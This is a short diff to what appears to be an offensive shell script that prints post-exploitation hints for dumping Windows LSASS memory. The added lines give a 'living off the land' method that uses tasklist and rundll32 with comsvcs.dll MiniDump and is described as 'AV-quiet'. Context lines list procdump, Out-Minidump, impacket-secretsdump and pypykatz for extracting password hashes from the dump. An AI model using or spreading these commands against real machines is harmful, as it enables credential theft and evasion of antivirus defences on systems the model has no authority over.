@@ -1458,6 +1458,9 @@ parse_windows_output() {
                 echo "# Option B: procdump64.exe -accepteula -ma lsass.exe lsass.dmp"
                 echo "# Option C (MiniDumpWriteDump via PowerShell, no procdump needed):"
                 echo "#   Get-Process lsass | Out-Minidump (PowerSploit / pypykatz offline parse)"
+                echo "# Option D (LOLBAS — comsvcs.dll, built-in, no drop, AV-quiet):"
+                echo "#   tasklist /fi \"imagename eq lsass.exe\"                                    # get PID"
+                echo "#   rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> C:\\Windows\\Temp\\lsass.dmp full"
                 echo "# Exfil + parse: impacket-secretsdump -just-dc-ntlm -outputfile hashes -ntds lsass.dmp LOCAL"
                 echo "# Or: pypykatz lsa minidump lsass.dmp"
             fi
